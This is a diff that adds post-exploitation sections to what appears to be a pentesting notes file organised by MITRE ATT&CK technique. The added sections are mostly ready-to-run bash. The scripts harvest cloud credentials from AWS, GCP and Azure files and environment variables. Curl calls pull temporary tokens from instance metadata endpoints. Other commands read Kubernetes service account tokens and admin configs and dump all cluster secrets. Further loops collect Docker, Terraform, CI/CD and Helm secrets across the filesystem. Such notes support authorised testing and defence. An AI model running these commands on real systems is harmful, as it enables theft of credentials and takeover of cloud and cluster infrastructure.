@@ -17,6 +17,11 @@
 - [Go Environment Variable Enumeration (T1082)](#go-environment-variable-enumeration-t1082)
 - [Jira (T1087)](#jira-t1087)
 - [Pentesting Kafka (T1046)](#pentesting-kafka-t1046)
+- [Post-Exploitation Cloud Credential Harvesting (T1552.001)](#post-exploitation-cloud-credential-harvesting-t1552001)
+- [IMDS and Container Credential Theft (T1552.005)](#imds-and-container-credential-theft-t1552005)
+- [Kubernetes Service Account Token Theft (T1552.007)](#kubernetes-service-account-token-theft-t1552007)
+- [Docker Registry Credential Harvesting (T1552.001)](#docker-registry-credential-harvesting-t1552001)
+- [CI/CD and IaC Secret Harvesting (T1552.001)](#cicd-and-iac-secret-harvesting-t1552001)
 
 ---
 
@@ -708,4 +713,134 @@ Save messages for offline analysis;
 
 ```sh
 kcat -b target.com:9092 -t AlertNotifications -C -J | jq . > messages.json
+```
+
+## Post-Exploitation Cloud Credential Harvesting (T1552.001)
+
+After gaining access to a host, cloud provider credentials are often stored in well-known file paths. The following enumerates credential files across AWS, GCP, and Azure for all users on the system:
+
+```bash
+# AWS credentials and config
+for home in /home/* /root; do
+  for f in "$home/.aws/credentials" "$home/.aws/config"; do
+    [ -f "$f" ] && echo "=== $f ===" && cat "$f"
+  done
+done
+
+# AWS credential environment variables
+env | grep -E "^AWS_"
+
+# GCP application default credentials and service account keys
+for home in /home/* /root; do
+  find "$home/.config/gcloud" -type f 2>/dev/null | while read -r f; do
+    echo "=== $f ===" && cat "$f"
+  done
+done
+cat "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null
+env | grep -iE "(GOOGLE|GCLOUD)"
+
+# Azure credential files
+for home in /home/* /root; do
+  find "$home/.azure" -type f 2>/dev/null | while read -r f; do
+    echo "=== $f ===" && cat "$f"
+  done
+done
+env | grep -i AZURE
+```
+
+## IMDS and Container Credential Theft (T1552.005)
+
+Cloud instance metadata services (IMDS) and container credential endpoints expose temporary credentials. These are commonly targeted after gaining code execution inside a cloud workload:
+
+```bash
+# AWS EC2 IMDS v1 - List available IAM roles then fetch temporary credentials
+ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
+
+# AWS ECS container credentials (uses task role URI from environment)
+curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
+
+# GCP - Fetch access token from metadata server
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+
+# Azure IMDS - Fetch managed identity token
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+## Kubernetes Service Account Token Theft (T1552.007)
+
+Kubernetes pods are provisioned with service account tokens that can be used to authenticate to the API server. Common mount paths vary between container runtimes:
+
+```bash
+# Standard service account token mount paths
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /run/secrets/kubernetes.io/serviceaccount/token
+
+# Service account CA certificate and namespace
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# Kubeconfig files across user home directories
+for home in /home/* /root; do
+  [ -f "$home/.kube/config" ] && echo "=== $home/.kube/config ===" && cat "$home/.kube/config"
+done
+
+# Cluster admin and component configs
+for f in /etc/kubernetes/admin.conf \
+         /etc/kubernetes/kubelet.conf \
+         /etc/kubernetes/controller-manager.conf \
+         /etc/kubernetes/scheduler.conf; do
+  [ -f "$f" ] && echo "=== $f ===" && cat "$f"
+done
+
+# Enumerate all mounted secrets
+find /var/secrets /run/secrets -type f 2>/dev/null | while read -r f; do
+  echo "=== $f ===" && cat "$f" 2>/dev/null
+done
+
+# Dump secrets via kubectl if accessible
+kubectl get secrets --all-namespaces -o json 2>/dev/null
+```
+
+## Docker Registry Credential Harvesting (T1552.001)
+
+Docker stores registry authentication tokens in config files that can be used to pull or push images to private registries:
+
+```bash
+# User Docker configs
+for home in /home/* /root; do
+  [ -f "$home/.docker/config.json" ] && echo "=== $home/.docker/config.json ===" && cat "$home/.docker/config.json"
+done
+
+# Kaniko builder credentials (common in CI/CD pipelines)
+cat /kaniko/.docker/config.json 2>/dev/null
+```
+
+## CI/CD and IaC Secret Harvesting (T1552.001)
+
+Terraform state files, variable files, and CI/CD configuration files frequently contain plaintext credentials, API keys, and infrastructure secrets:
+
+```bash
+# Terraform variable files (may contain cloud credentials, database passwords)
+find / -name "*.tfvars" -type f 2>/dev/null -exec sh -c 'echo "=== {} ===" && cat "{}"' \;
+
+# Terraform state files (contain full resource attributes including secrets)
+find / -name "terraform.tfstate" -type f 2>/dev/null -exec sh -c 'echo "=== {} ===" && cat "{}"' \;
+
+# CI/CD configuration files
+for f in .gitlab-ci.yml .travis.yml Jenkinsfile .drone.yml; do
+  [ -f "$f" ] && echo "=== $f ===" && cat "$f"
+done
+
+# Ansible configuration (may reference vault passwords)
+cat ansible.cfg 2>/dev/null
+
+# Helm chart values (may contain secrets)
+for home in /home/* /root; do
+  find "$home/.helm" -type f 2>/dev/null | while read -r f; do
+    echo "=== $f ===" && cat "$f"
+  done
+done
 ```
